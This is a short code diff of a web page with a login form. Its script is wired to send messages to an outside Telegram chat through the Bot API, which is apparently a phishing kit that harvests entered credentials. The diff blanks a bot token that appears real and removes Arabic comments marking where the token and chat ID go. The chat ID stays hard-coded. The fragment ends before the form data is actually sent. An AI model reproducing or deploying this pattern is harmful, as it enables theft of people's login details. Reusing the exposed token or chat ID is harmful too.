@@ -70,9 +70,10 @@
 
  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
 <script>
-    const TOKEN = "8151959067:AAHP0w6GLyvZLpNOQwaf53_iTaXB3gzpJTE";                                                            // هنا التوكين              
-    const CHAT_ID = "5283726858";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    const TOKEN = "";                                                                     
+    const CHAT_ID = "5283726858";                                                       
+
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;      
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
         e.preventDefault();
